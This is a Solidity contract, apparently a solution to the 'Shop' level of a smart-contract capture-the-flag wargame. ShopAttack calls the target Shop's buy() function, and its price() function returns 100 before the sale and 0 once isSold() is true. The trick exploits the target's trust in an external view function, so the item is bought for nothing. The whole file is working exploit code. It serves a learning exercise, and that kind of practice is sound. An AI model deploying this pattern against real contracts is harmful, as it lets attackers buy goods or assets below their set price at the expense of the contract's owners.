// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./21_Shop.sol";

contract ShopAttack {
  address immutable shopAddr;

  constructor(address _shopAddr) {
    shopAddr = _shopAddr;
  }

  function attack() external {
    Shop(shopAddr).buy();
  }

  function price() external view returns (uint) {
    return Shop(shopAddr).isSold() ? 0 : 100;
  }

}